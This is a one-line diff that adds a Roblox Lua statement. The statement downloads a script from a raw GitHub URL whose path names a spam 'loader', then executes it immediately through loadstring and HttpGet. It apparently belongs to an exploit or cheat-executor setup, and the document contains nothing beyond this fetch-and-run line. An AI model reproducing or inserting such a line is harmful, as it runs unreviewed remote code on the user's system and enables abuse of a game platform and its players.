@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/beta-buddytime-spam1-cnbvmqhkjnbkpn.lua"))()
